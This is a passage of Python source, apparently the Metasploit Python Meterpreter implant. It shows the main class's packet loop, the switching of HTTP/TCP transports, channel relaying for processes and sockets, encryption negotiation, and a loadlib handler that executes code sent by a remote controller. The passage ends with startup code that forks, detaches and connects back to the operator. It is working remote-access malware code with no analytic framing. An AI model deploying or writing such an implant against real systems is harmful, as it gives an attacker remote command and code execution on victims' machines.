        if not isinstance(channel, MeterpreterChannel):
            debug_print('[-] channel object is not an instance of MeterpreterChannel')
            raise TypeError('invalid channel object')
        idx = self.next_channel_id
        self.channels[idx] = channel
        debug_print('[*] added channel id: ' + str(idx) + ' type: ' + channel.__class__.__name__)
        self.next_channel_id += 1
        return idx

    def add_process(self, process):
        idx = self.next_process_id
        self.processes[idx] = process
        debug_print('[*] added process id: ' + str(idx))
        self.next_process_id += 1
        return idx

    def get_packet(self):
        pkt = self.transport.get_packet(self.aes_key)
        if pkt is None and self.transport.should_retire:
            self.transport_change()
        return pkt

    def send_packet(self, packet):
        aes_key = None
        if self.aes_key and self.aes_enabled:
            aes_key = self.aes_key
        send_succeeded = self.transport.send_packet(packet, aes_key)
        if self.aes_key:
            self.aes_enabled = True
        if not send_succeeded and self.transport.should_retire:
            self.transport_change()
        return send_succeeded

    @property
    def session_has_expired(self):
        if self.session_expiry_time == 0:
            return False
        return time.time() > self.session_expiry_end

    def transport_add(self, new_transport):
        new_position = self.transports.index(self.transport)
        self.transports.insert(new_position, new_transport)

    def transport_change(self, new_transport=None):
        if new_transport is None:
            new_transport = self.transport_next()
        self.transport.deactivate()
        debug_print('[*] changing transport to: ' + new_transport.url)
        while not new_transport.activate():
            new_transport = self.transport_next(new_transport)
            debug_print('[*] changing transport to: ' + new_transport.url)
        self.transport = new_transport

    def transport_next(self, current_transport=None):
        if current_transport is None:
            current_transport = self.transport
        new_idx = self.transports.index(current_transport) + 1
        if new_idx == len(self.transports):
            new_idx = 0
        return self.transports[new_idx]

    def transport_prev(self, current_transport=None):
        if current_transport is None:
            current_transport = self.transport
        new_idx = self.transports.index(current_transport) - 1
        if new_idx == -1:
            new_idx = len(self.transports) - 1
        return self.transports[new_idx]

    def run(self):
        while self.running and not self.session_has_expired:
            request = self.get_packet()
            if request:
                response = self.create_response(request)
                if response:
                    self.send_packet(response)
                if self._transport_sleep:
                    self.transport.deactivate()
                    time.sleep(self._transport_sleep)
                    self._transport_sleep = None
                    if not self.transport.activate():
                        self.transport_change()
                    continue
            # iterate over the keys because self.channels could be modified if one is closed
            channel_ids = list(self.channels.keys())
            for channel_id in channel_ids:
                channel = self.channels[channel_id]
                data = bytes()
                write_request_parts = []
                if isinstance(channel, MeterpreterProcess):
                    if not channel_id in self.interact_channels:
                        continue
                    proc_h = channel.proc_h
                    if proc_h.stderr_reader.is_read_ready():
                        data = proc_h.stderr_reader.read()
                    elif proc_h.stdout_reader.is_read_ready():
                        data = proc_h.stdout_reader.read()
                    elif not channel.is_alive():
                        self.handle_dead_resource_channel(channel_id)
                elif isinstance(channel, MeterpreterSocketTCPClient):
                    while select.select([channel.fileno()], [], [], 0)[0]:
                        try:
                            d = channel.read(1)
                        except socket.error:
                            d = bytes()
                        if len(d) == 0:
                            self.handle_dead_resource_channel(channel_id)
                            break
                        data += d
                elif isinstance(channel, MeterpreterSocketTCPServer):
                    if select.select([channel.fileno()], [], [], 0)[0]:
                        (client_sock, client_addr) = channel.sock.accept()
                        server_addr = channel.sock.getsockname()
                        client_channel_id = self.add_channel(MeterpreterSocketTCPClient(client_sock))
                        self.send_packet(tlv_pack_request('tcp_channel_open', [
                            {'type': TLV_TYPE_CHANNEL_ID, 'value': client_channel_id},
                            {'type': TLV_TYPE_CHANNEL_PARENTID, 'value': channel_id},
                            {'type': TLV_TYPE_LOCAL_HOST, 'value': inet_pton(channel.sock.family, server_addr[0])},
                            {'type': TLV_TYPE_LOCAL_PORT, 'value': server_addr[1]},
                            {'type': TLV_TYPE_PEER_HOST, 'value': inet_pton(client_sock.family, client_addr[0])},
                            {'type': TLV_TYPE_PEER_PORT, 'value': client_addr[1]},
                        ]))
                elif isinstance(channel, MeterpreterSocketUDPClient):
                    if select.select([channel.fileno()], [], [], 0)[0]:
                        try:
                            data, peer_address = channel.sock.recvfrom(65535)
                        except socket.error:
                            self.handle_dead_resource_channel(channel_id)
                        else:
                            write_request_parts.extend([
                                {'type': TLV_TYPE_PEER_HOST, 'value': peer_address[0]},
                                {'type': TLV_TYPE_PEER_PORT, 'value': peer_address[1]},
                            ])
                if data:
                    write_request_parts.extend([
                        {'type': TLV_TYPE_CHANNEL_ID, 'value': channel_id},
                        {'type': TLV_TYPE_CHANNEL_DATA, 'value': data},
                        {'type': TLV_TYPE_LENGTH, 'value': len(data)},
                    ])
                    self.send_packet(tlv_pack_request('core_channel_write', write_request_parts))

    def handle_dead_resource_channel(self, channel_id):
        del self.channels[channel_id]
        if channel_id in self.interact_channels:
            self.interact_channels.remove(channel_id)
        self.send_packet(tlv_pack_request('core_channel_close', [
            {'type': TLV_TYPE_CHANNEL_ID, 'value': channel_id},
        ]))

    def _core_negotiate_tlv_encryption(self, request, response):
        if has_crypto:
            pub_key = packet_get_tlv(request, TLV_TYPE_RSA_PUB_KEY)['value']
            self.aes_key = bytes(os.urandom(AES_KEY_SIZE))
            response += tlv_pack(TLV_TYPE_SYM_KEY_TYPE, ENC_AES256)
            try:
                key = rsa.PublicKey.load_pkcs1_openssl_pem(pub_key)
                response += tlv_pack(TLV_TYPE_ENC_SYM_KEY, rsa.encrypt(self.aes_key, key))
            except:
                response += tlv_pack(TLV_TYPE_SYM_KEY, self.aes_key)
            return ERROR_SUCCESS, response
        else:
            return error_result(NotImplementedError), response

    def _core_set_uuid(self, request, response):
        new_uuid = packet_get_tlv(request, TLV_TYPE_UUID)
        if new_uuid:
            PAYLOAD_UUID = binascii.b2a_hex(new_uuid['value'])
        return ERROR_SUCCESS, response

    def _core_enumextcmd(self, request, response):
        extension_name = packet_get_tlv(request, TLV_TYPE_STRING)['value']
        for func_name in self.extension_functions.keys():
            if func_name.split('_', 1)[0] == extension_name:
                response += tlv_pack(TLV_TYPE_STRING, func_name)
        return ERROR_SUCCESS, response

    def _core_get_session_guid(self, request, response):
        response += tlv_pack(TLV_TYPE_SESSION_GUID, binascii.a2b_hex(bytes(SESSION_GUID, 'UTF-8')))
        return ERROR_SUCCESS, response

    def _core_set_session_guid(self, request, response):
        new_guid = packet_get_tlv(request, TLV_TYPE_SESSION_GUID)
        if new_guid:
            SESSION_GUID = binascii.b2a_hex(new_guid['value'])
        return ERROR_SUCCESS, response

    def _core_machine_id(self, request, response):
        serial = ''
        machine_name = platform.uname()[1]
        if has_windll:
            from ctypes import wintypes

            k32 = ctypes.windll.kernel32
            sys_dir = ctypes.create_unicode_buffer(260)
            if not k32.GetSystemDirectoryW(ctypes.byref(sys_dir), 260):
                return ERROR_FAILURE_WINDOWS

            vol_buf = ctypes.create_unicode_buffer(260)
            fs_buf = ctypes.create_unicode_buffer(260)
            serial_num = wintypes.DWORD(0)

            if not k32.GetVolumeInformationW(ctypes.c_wchar_p(sys_dir.value[:3]),
                    vol_buf, ctypes.sizeof(vol_buf), ctypes.byref(serial_num), None,
                    None, fs_buf, ctypes.sizeof(fs_buf)):
                return ERROR_FAILURE_WINDOWS
            serial_num = serial_num.value
            serial = "%04x" % ((serial_num >> 16) & 0xffff) + '-' "%04x" % (serial_num & 0xffff)
        else:
            serial = get_hdd_label()

        response += tlv_pack(TLV_TYPE_MACHINE_ID, "%s:%s" % (serial, machine_name))
        return ERROR_SUCCESS, response

    def _core_native_arch(self, request, response):
        response += tlv_pack(TLV_TYPE_STRING, get_native_arch())
        return ERROR_SUCCESS, response

    def _core_patch_url(self, request, response):
        if not isinstance(self.transport, HttpTransport):
            return ERROR_FAILURE, response
        new_uri_path = packet_get_tlv(request, TLV_TYPE_TRANS_URL)['value']
        if not self.transport.patch_uri_path(new_uri_path):
            return ERROR_FAILURE, response
        return ERROR_SUCCESS, response

    def _core_loadlib(self, request, response):
        data_tlv = packet_get_tlv(request, TLV_TYPE_DATA)
        if (data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED:
            return ERROR_FAILURE, response

        self.last_registered_extension = None
        symbols_for_extensions = {'meterpreter':self}
        symbols_for_extensions.update(EXPORTED_SYMBOLS)
        i = code.InteractiveInterpreter(symbols_for_extensions)
        i.runcode(compile(data_tlv['value'], '', 'exec'))
        extension_name = self.last_registered_extension

        if extension_name:
            check_extension = lambda x: x.startswith(extension_name)
            lib_methods = list(filter(check_extension, list(self.extension_functions.keys())))
            for method in lib_methods:
                response += tlv_pack(TLV_TYPE_METHOD, method)
        return ERROR_SUCCESS, response

    def _core_shutdown(self, request, response):
        response += tlv_pack(TLV_TYPE_BOOL, True)
        self.running = False
        return ERROR_SUCCESS, response

    def _core_transport_add(self, request, response):
        new_transport = Transport.from_request(request)
        self.transport_add(new_transport)
        return ERROR_SUCCESS, response

    def _core_transport_change(self, request, response):
        new_transport = Transport.from_request(request)
        self.transport_add(new_transport)
        self.send_packet(response + tlv_pack(TLV_TYPE_RESULT, ERROR_SUCCESS))
        self.transport_change(new_transport)
        return None

    def _core_transport_list(self, request, response):
        if self.session_expiry_time > 0:
            response += tlv_pack(TLV_TYPE_TRANS_SESSION_EXP, self.session_expiry_end - time.time())
        response += tlv_pack(TLV_TYPE_TRANS_GROUP, self.transport.tlv_pack_transport_group())

        transport = self.transport_next()
        while transport != self.transport:
            response += tlv_pack(TLV_TYPE_TRANS_GROUP, transport.tlv_pack_transport_group())
            transport = self.transport_next(transport)
        return ERROR_SUCCESS, response

    def _core_transport_next(self, request, response):
        new_transport = self.transport_next()
        if new_transport == self.transport:
            return ERROR_FAILURE, response
        self.send_packet(response + tlv_pack(TLV_TYPE_RESULT, ERROR_SUCCESS))
        self.transport_change(new_transport)
        return None

    def _core_transport_prev(self, request, response):
        new_transport = self.transport_prev()
        if new_transport == self.transport:
            return ERROR_FAILURE, response
        self.send_packet(response + tlv_pack(TLV_TYPE_RESULT, ERROR_SUCCESS))
        self.transport_change(new_transport)
        return None

    def _core_transport_remove(self, request, response):
        url = packet_get_tlv(request, TLV_TYPE_TRANS_URL)['value']
        if self.transport.url == url:
            return ERROR_FAILURE, response
        transport_found = False
        for transport in self.transports:
            if transport.url == url:
                transport_found = True
                break
        if transport_found:
            self.transports.remove(transport)
            return ERROR_SUCCESS, response
        return ERROR_FAILURE, response

    def _core_transport_set_timeouts(self, request, response):
        timeout_value = packet_get_tlv(request, TLV_TYPE_TRANS_SESSION_EXP).get('value')
        if not timeout_value is None:
            self.session_expiry_time = timeout_value
            self.session_expiry_end = time.time() + self.session_expiry_time
        timeout_value = packet_get_tlv(request, TLV_TYPE_TRANS_COMM_TIMEOUT).get('value')
        if timeout_value:
            self.transport.communication_timeout = timeout_value
        retry_value = packet_get_tlv(request, TLV_TYPE_TRANS_RETRY_TOTAL).get('value')
        if retry_value:
            self.transport.retry_total = retry_value
        retry_value = packet_get_tlv(request, TLV_TYPE_TRANS_RETRY_WAIT).get('value')
        if retry_value:
            self.transport.retry_wait = retry_value

        if self.session_expiry_time > 0:
            response += tlv_pack(TLV_TYPE_TRANS_SESSION_EXP, self.session_expiry_end - time.time())
        response += self.transport.tlv_pack_timeouts()
        return ERROR_SUCCESS, response

    def _core_transport_sleep(self, request, response):
        seconds = packet_get_tlv(request, TLV_TYPE_TRANS_COMM_TIMEOUT)['value']
        self.send_packet(response + tlv_pack(TLV_TYPE_RESULT, ERROR_SUCCESS))
        if seconds:
            self._transport_sleep = seconds
        return ERROR_SUCCESS, response

    def _core_channel_open(self, request, response):
        channel_type = packet_get_tlv(request, TLV_TYPE_CHANNEL_TYPE)
        handler = 'channel_open_' + channel_type['value']
        if handler not in self.extension_functions:
            debug_print('[-] core_channel_open missing handler: ' + handler)
            return error_result(NotImplementedError), response
        debug_print('[*] core_channel_open dispatching to handler: ' + handler)
        handler = self.extension_functions[handler]
        return handler(request, response)

    def _core_channel_close(self, request, response):
        channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
        if channel_id not in self.channels:
            return ERROR_FAILURE, response
        channel = self.channels[channel_id]
        status, response = channel.core_close(request, response)
        if status == ERROR_SUCCESS:
            del self.channels[channel_id]
            if channel_id in self.interact_channels:
                self.interact_channels.remove(channel_id)
            debug_print('[*] closed and removed channel id: ' + str(channel_id))
        return status, response

    def _core_channel_eof(self, request, response):
        channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
        if channel_id not in self.channels:
            return ERROR_FAILURE, response
        channel = self.channels[channel_id]
        status, response = channel.core_eof(request, response)
        return ERROR_SUCCESS, response


    def _core_channel_interact(self, request, response):
        channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
        if channel_id not in self.channels:
            return ERROR_FAILURE, response
        channel = self.channels[channel_id]
        toggle = packet_get_tlv(request, TLV_TYPE_BOOL)['value']
        if toggle:
            if channel_id in self.interact_channels:
                self.interact_channels.remove(channel_id)
            else:
                self.interact_channels.append(channel_id)
        elif channel_id in self.interact_channels:
            self.interact_channels.remove(channel_id)
        return ERROR_SUCCESS, response

    def _core_channel_read(self, request, response):
        channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
        if channel_id not in self.channels:
            return ERROR_FAILURE, response
        channel = self.channels[channel_id]
        status, response = channel.core_read(request, response)
        if not channel.is_alive():
            self.handle_dead_resource_channel(channel_id)
        return status, response

    def _core_channel_write(self, request, response):
        channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
        if channel_id not in self.channels:
            return ERROR_FAILURE, response
        channel = self.channels[channel_id]
        status = ERROR_FAILURE
        if channel.is_alive():
            status, response = channel.core_write(request, response)
        # evaluate channel.is_alive() twice because it could have changed
        if not channel.is_alive():
            self.handle_dead_resource_channel(channel_id)
        return status, response

    def create_response(self, request):
        response = struct.pack('>I', PACKET_TYPE_RESPONSE)
        method_tlv = packet_get_tlv(request, TLV_TYPE_METHOD)
        response += tlv_pack(method_tlv)
        response += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(bytes(PAYLOAD_UUID, 'UTF-8')))

        handler_name = method_tlv['value']
        if handler_name in self.extension_functions:
            handler = self.extension_functions[handler_name]
            try:
                debug_print('[*] running method ' + handler_name)
                result = handler(request, response)
                if result is None:
                    return
                result, response = result
            except Exception:
                debug_traceback('[-] method ' + handler_name + ' resulted in an error')
                result = error_result()
            else:
                if result != ERROR_SUCCESS:
                    debug_print('[-] method ' + handler_name + ' resulted in error: #' + str(result))
        else:
            debug_print('[-] method ' + handler_name + ' was requested but does not exist')
            result = error_result(NotImplementedError)

        reqid_tlv = packet_get_tlv(request, TLV_TYPE_REQUEST_ID)
        if not reqid_tlv:
            return
        response += tlv_pack(reqid_tlv)
        return response + tlv_pack(TLV_TYPE_RESULT, result)

_try_to_fork = TRY_TO_FORK and hasattr(os, 'fork')
if not _try_to_fork or (_try_to_fork and os.fork() == 0):
    if hasattr(os, 'setsid'):
        try:
            os.setsid()
        except OSError:
            pass
    if HTTP_CONNECTION_URL and has_urllib:
        transport = HttpTransport(HTTP_CONNECTION_URL, proxy=HTTP_PROXY, user_agent=HTTP_USER_AGENT,
                http_host=HTTP_HOST, http_referer=HTTP_REFERER, http_cookie=HTTP_COOKIE)
    else:
        # PATCH-SETUP-STAGELESS-TCP-SOCKET #
        transport = TcpTransport.from_socket(s)
    met = PythonMeterpreter(transport)
    # PATCH-SETUP-TRANSPORTS #
    met.run()
